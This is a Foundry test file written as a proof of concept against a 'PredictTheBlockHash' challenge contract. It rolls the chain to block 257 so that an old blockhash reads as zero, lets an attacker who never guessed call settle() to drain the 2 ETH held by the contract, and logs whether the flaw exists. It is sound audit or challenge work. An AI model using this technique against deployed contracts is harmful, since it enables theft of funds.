// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/old_blockhash.sol";

contract PredictTheBlockHashTest is Test {
    PredictTheBlockHashChallenge public challenge;
    address public deployer = makeAddr("deployer");
    address public victim = makeAddr("victim");
    address public attacker = makeAddr("attacker");

    function setUp() public {
        vm.deal(deployer, 1 ether);
        vm.deal(victim, 1 ether);
        vm.deal(attacker, 1 ether);

        vm.prank(deployer);
        challenge = new PredictTheBlockHashChallenge{value: 1 ether}();
    }

    function testAttackWithoutGuess() public {
        // Victim makes valid guess with 1 ETH deposit
        vm.prank(victim);
        challenge.lockInGuess{value: 1 ether}(keccak256("valid_guess"));
        
        // Move to block 257 (where blockhash(0) becomes zero)
        vm.roll(257);

        console.log("\n--- BEFORE-Trigger State ---");
        uint256 contractBalanceBefore = address(challenge).balance;
        uint256 attackerBalanceBefore = attacker.balance;
        uint256 totalWinnersBefore = challenge.totalWinners();
        uint256 attackerWinsBefore = challenge.playerWins(attacker);
        
        console.log("Contract Balance (before): %d", contractBalanceBefore);
        console.log("Attacker Balance (before): %d", attackerBalanceBefore);
        console.log("Total Winners (before): %d", totalWinnersBefore);
        console.log("Attacker Wins (before): %d", attackerWinsBefore);

        console.log("\n--- Trigger: Attacker calls settle ---");
        // Attacker calls settle without ever guessing
        vm.prank(attacker);
        challenge.settle();

        console.log("\n--- AFTER-Trigger State ---");
        uint256 contractBalanceAfter = address(challenge).balance;
        uint256 attackerBalanceAfter = attacker.balance;
        uint256 totalWinnersAfter = challenge.totalWinners();
        uint256 attackerWinsAfter = challenge.playerWins(attacker);
        
        console.log("Contract Balance (after): %d", contractBalanceAfter);
        console.log("Attacker Balance (after): %d", attackerBalanceAfter);
        console.log("Total Winners (after): %d", totalWinnersAfter);
        console.log("Attacker Wins (after): %d", attackerWinsAfter);

        console.log("\n--- Vulnerability Detection Result ---");
        bool contractDrained = (contractBalanceAfter == 0);
        bool attackerGained = (attackerBalanceAfter == attackerBalanceBefore + 2 ether);
        bool totalWinnersIncreased = (totalWinnersAfter == totalWinnersBefore + 1);
        bool attackerWinsIncreased = (attackerWinsAfter == attackerWinsBefore + 1);

        // Final vulnerability verification
        if (contractDrained && attackerGained && totalWinnersIncreased && attackerWinsIncreased) {
            console.log("Vulnerability Exists: The contract was drained and attacker became a winner without valid guess");
        } else {
            console.log("Vulnerability not Exist: State changes do not indicate successful exploitation");
        }
    }
}